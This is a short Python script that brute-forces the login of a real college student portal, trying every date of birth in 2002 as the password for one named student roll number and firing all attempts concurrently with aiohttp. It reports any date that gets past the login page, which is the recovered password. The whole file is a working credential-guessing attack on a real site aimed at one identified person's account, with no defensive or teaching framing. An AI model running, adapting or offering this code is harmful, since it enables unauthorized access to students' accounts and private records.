import asyncio
from time import sleep, perf_counter, time, clock, process_time
from datetime import datetime
from requests import post, get, Session

from sys import path
from os import getcwd
path.append(getcwd().rstrip('testfiles'))
import aiohttp

#from kcg import finddob

student_login_url = 'http://studentlogin.kcgcollege.ac.in/'

student_login_payload = {
    '__EVENTTARGET' : '' ,
    '__EVENTARGUMENT' : '',
    '__LASTFOCUS' : '',
    '__VIEWSTATE' : '/wEPDwUJMjkwMTA2NTY5D2QWAgIDD2QWCgIDDxAPFgYeDURhdGFUZXh0RmllbGQFCGNvbGxuYW1lHg5EYXRhVmFsdWVGaWVsZAUMY29sbGVnZV9jb2RlHgtfIURhdGFCb3VuZGdkEBUBGUtDRyBDb2xsZWdlIG9mIFRlY2hub2xvZ3kVAQIxMxQrAwFnFgFmZAIFDxBkEBUCC1JvbGwgTnVtYmVyEVJlZ2lzdGVyZWQgTnVtYmVyFQIBMAExFCsDAmdnFgFmZAIHDw9kFgQeC3BsYWNlaG9sZGVyBQtSb2xsIE51bWJlch4MYXV0b2NvbXBsZXRlBQNvZmZkAgsPD2QWAh8EBQNvZmZkAg8PDxYCHgdWaXNpYmxlaGRkZEUh8Q9VeEnmpvJTjWVIwQmtVpX5IBYcjkAZZqWYNv5m', 
    '__VIEWSTATEGENERATOR' : 'CA0B0334',
    '__EVENTVALIDATION' : '/wEdAAfEhVpMiIC9PlqrGxNesSta1ewWtm3evXPJ0S9N/1pup/olUdBTEtKbUYVn9qLUVnP36l7NJf9XLe0xTP1byily7ATayzSAKKfWGUr2Dqcb+ZxpWckI3qdmfEJVCu2f5cHN+DvxnwFeFeJ9MIBWR6935FJfAFbS62yyYTlq6hIkdlrWUyRFAO0MmBe4dmPHJe8=',
    'rblOnlineAppLoginMode' : '0',
    'txtuname' : '20cs008',
    'txtpassword' : None,
    'Button1' : 'Login'
}

async def check_date(s, The_day_):

    global student_login_payload

    student_login_payload['txtpassword'] = The_day_    
                
    
    try:
        page = await s.post(student_login_url, data = student_login_payload, timeout = 5)
    except:
        pass
      
    
    if str(page.url) != student_login_url: 
                   
        #print("date",  The_day_)
        return The_day_
    return False
    
    #return False
    

months = {
            '01' : 31, '02' : 29, '03' : 31, '04' : 30,
            '05' : 31, '06' : 30, '07' : 31, '08' : 31,
            '09' : 30, '10' : 31, '11' : 30, '12' : 31,
        }

count = 0
async def A():
    global count
    tasks = []

    async with aiohttp.ClientSession() as s:

        for str_yob in ('2002',):
            for str_month in ('01', '02', '03', '04', '05', '06', '07', '08', '09', '10', '11', '12'):
                days = months[str_month]

                for day in range(1,days + 1):
                    str_day = str(day)
                    if len(str_day) == 1:
                        str_day = '0' + str_day

                    The_day = str_day + str_month + str_yob
                    count += 1

                    tasks.append(asyncio.create_task(check_date(s, The_day)))
        start = perf_counter()
        lis = await asyncio.gather(*tasks)
        lis2 = []

        for i in lis:
            if i != False:
                lis2.append(i)

        print(lis2)
        print(perf_counter() - start)

    
    
    
    
    
    
    

asyncio.run(A())